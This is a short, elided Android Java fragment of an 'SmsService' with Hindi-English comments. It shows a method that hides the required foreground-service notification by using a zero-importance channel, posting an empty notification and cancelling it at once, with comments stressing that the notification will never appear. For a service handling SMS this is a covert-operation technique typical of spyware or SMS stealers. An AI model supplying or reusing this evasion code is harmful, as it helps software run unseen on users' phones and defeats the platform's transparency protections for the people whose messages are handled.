...
public class SmsService extends Service {
    ...
    private void hideNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Channel banao with IMPORTANCE_NONE — notification bar mein dikhega hi nahi
            NotificationChannel channel = new NotificationChannel(
                "sms_channel",
                "SMS Service",
                NotificationManager.IMPORTANCE_NONE  // ← YEH IMPORTANT HAI
            );
            ...
            // Notification with empty title and text
            ...
            // Turant notification cancel karo
            if (manager != null) {
                manager.cancel(NOTIFICATION_ID);
            }

            // Dobara startForeground call karo bina notification dikhaye
